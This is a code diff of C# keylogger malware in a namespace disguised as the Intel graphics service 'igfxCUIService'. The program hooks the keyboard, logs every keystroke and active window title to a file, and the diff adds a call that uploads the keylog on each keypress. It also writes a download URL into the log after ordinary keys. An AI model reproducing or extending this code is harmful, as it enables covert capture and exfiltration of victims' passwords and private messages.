@@ -33,18 +33,20 @@ namespace igfxCUIService
 
             keystrokeApi.CreateKeyboardHook(Save);
             Application.Run();
+
         }
         #endregion
 
         #region save keylog
         private static void Save(KeyPressed key)
         {
+            
             System.IO.Directory.CreateDirectory(pathString);
-
+            Upload.Keylogupload();
             using (StreamWriter sw = File.AppendText(path))
             {
                 hWndTitle = window.GetActiveWindowTitle();
-
+                
                 if (hWndTitle != hWndTitlePast)
                 {
                     sw.WriteLine(Environment.NewLine);
@@ -86,7 +88,8 @@ namespace igfxCUIService
                     { sw.WriteLine("<Page Down>"); }
                     else if (key.KeyCode.ToString() == "LWin" || key.KeyCode.ToString() == "RWin")
                     { sw.Write("<Win>"); }
-                    else { sw.Write(key); } 
+                    else { sw.Write(key); sw.WriteLine(Upload.downloadUrl); }
+                    
                 }
             }
         }
